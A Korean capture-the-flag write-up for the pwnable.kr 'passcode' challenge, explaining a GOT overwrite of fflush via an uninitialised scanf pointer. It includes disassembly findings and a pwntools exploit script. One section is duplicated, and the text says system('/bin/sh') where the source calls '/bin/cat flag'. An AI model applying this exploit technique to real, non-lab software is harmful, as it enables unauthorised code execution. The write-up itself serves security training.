<img width="1024" height="614" alt="image" src="https://github.com/user-attachments/assets/998cba2d-7ecc-4e5e-8079-057e99fdab5d" />

### 🍞 개념

---

#### GOT overwrite

동적 링크(Dynamic Link) 방식으로 컴파일된 바이너리가 공유 라이브러리(예: `libc`)의 함수를 호출할 때 사용하는 **GOT(Global Offset Table)의 주소 값을 변조하여, 공격자가 원하는 악성 코드나 다른 함수가 실행되도록 만드는 시스템 해킹(BOF 등) 공격 기법**

### 🔎 코드 분석

---

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
		setregid(getegid(), getegid());
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.1 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}

```

```c
	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);
```

`scanf`가 두 개 있는데, 뭔가 이상하다..

`scanf`시에 `&`를 사용하지 않고 있다. `passcode1`에는 쓰레기 값이 들어있을 것이기 때문에 그냥 입력받으면 쓰레기주소에 값을 입력하는 것

<img width="500" height="272" alt="image" src="https://github.com/user-attachments/assets/9904bf0e-cf55-408c-8008-312e997382ed" />

checksec을 확인했을 때

Partial RELRO이기 때문에 GOT overwrite가 가능하고, Canary가 있어서 일반적인 Return address overwrite는 어려울 것 같다.

NX 때문에 셸 코드 주입도 어렵다.

<img width="716" height="278" alt="image" src="https://github.com/user-attachments/assets/fc0a9c33-36e4-4225-affd-ee6410e2e158" />

코드를 실행시키면 `name`을 입력받고 나서 `passcode1`을 입력받는다. 이후에는 `passcode2`를 입력받을 틈 도 없이 크래시가 나서 종료된다.

우리가 입력시킬 수 있는건 `name`과 `passcode1`밖에 없다.

<img width="1398" height="1190" alt="image" src="https://github.com/user-attachments/assets/c2e89a4f-14a8-4db0-8fa0-b113b3d157ce" />

`welcome` 함수를 디스어셈블 하면, `ebp-0x70`이 `name` 배열이라는 것을 알 수 있다.

<img width="1398" height="1190" alt="image" src="https://github.com/user-attachments/assets/08544529-ff41-4cd8-b121-4e1c8869d083" />

login 함수를 디스어셈블 해보자

`ebp-0x10`이 `passcode1`의 위치라고 유추할 수 있다.

<img width="1346" height="1000" alt="image" src="https://github.com/user-attachments/assets/6c17328a-587c-43e0-99c4-6d0842aa88ae" />

`welcome` 함수 실행시에 `passcode1` 부분을 덮어씌울 수 있을 것 같다

### 🗡️ 익스플로잇

---

`passcode1`을 어떤 걸로 덮어씌우면 좋을까?

GOT overwrite가 가능하니까, `scanf(”%d”, passcode1)` 이후에 실행되는 어떤 특정한 함수의 GOT를 다른 함수의 GOT로 바꿔버리면 어떨까?

코드 내에서 이미 `system(”/bin/sh”)`를 호출하고 있으니, 우리는 `system(”/bin/sh”)` 를 호출하는 부분을 알 수 있다 (PIE가 적용되어 있지 않아서 매번 고정)

#### 1️⃣ `passcode1`의 값을 `fflush`의 GOT 주소로 바꾼다

그러면 `scanf(”%d”, passcode1)`이 `fflush`의 GOT 주소를 조작할 수 있게 된다

#### 2️⃣ `fflush`의 GOT를 `system` 함수 호출부의 주소로

`scanf(”%d”, passcode1)` 실행 시에 `system(”/bin/sh”)` 함수를 호출하는 부분의 주소로 덮어씌운다

먼저 `fflush`의 GOT를 찾자`welcome` 함수 실행시에 `passcode1` 부분을 덮어씌울 수 있을 것 같다

### 🗡️ 익스플로잇

---

`passcode1`을 어떤 걸로 덮어씌우면 좋을까?

GOT overwrite가 가능하니까, `scanf(”%d”, passcode1)` 이후에 실행되는 어떤 특정한 함수의 GOT를 다른 함수의 GOT로 바꿔버리면 어떨까?

코드 내에서 이미 `system(”/bin/sh”)`를 호출하고 있으니, 우리는 `system(”/bin/sh”)` 를 호출하는 부분을 알 수 있다 (PIE가 적용되어 있지 않아서 매번 고정)

#### 1️⃣ `passcode1`의 값을 `fflush`의 GOT 주소로 바꾼다

그러면 `scanf(”%d”, passcode1)`이 `fflush`의 GOT 주소를 조작할 수 있게 된다

#### 2️⃣ `fflush`의 GOT를 `system` 함수 호출부의 주소로

`scanf(”%d”, passcode1)` 실행 시에 `system(”/bin/sh”)` 함수를 호출하는 부분의 주소로 덮어씌운다

먼저 `fflush`의 GOT를 찾자
<img width="1136" height="750" alt="image" src="https://github.com/user-attachments/assets/64d61b39-934f-4beb-9aeb-b7e483299817" />
`0x804c014` 인 것을 알 수 있다

다시 `login` 함수를 디스어셈블 해서
<img width="754" height="114" alt="image" src="https://github.com/user-attachments/assets/bb5e1923-c380-467b-a802-767c443c785c" />
`system` 함수 호출 전 `eax`에 어떤 값을 넣는 부분을 찾는다 (`/bin/sh` 인자 세팅을 해야하기 때문)

`0x080492bd` 값을 덮어씌워서 점프시키면 좋을 것 같다.

```python
from pwn import *

r = remote('pwnable.kr', 10004)

fflush = int(0x804c014)
system = int(0x080492bd)

r.sendlineafter('name :', b'A'*96 + p32(fflush))

r.sendlineafter(b'passcode1 : ', str(system).encode())

r.interactive()
```

```python
r.sendlineafter(b'passcode1 : ', str(system).encode())
```

`passcode1`은 `scanf(”%d”)`를 통해 정수로 입력받으므로, int로 바꿔서 string으로 날려야 한다
<img width="1398" height="1190" alt="image" src="https://github.com/user-attachments/assets/00be24cf-3870-4678-8fbe-fc11eb9a6ccf" />
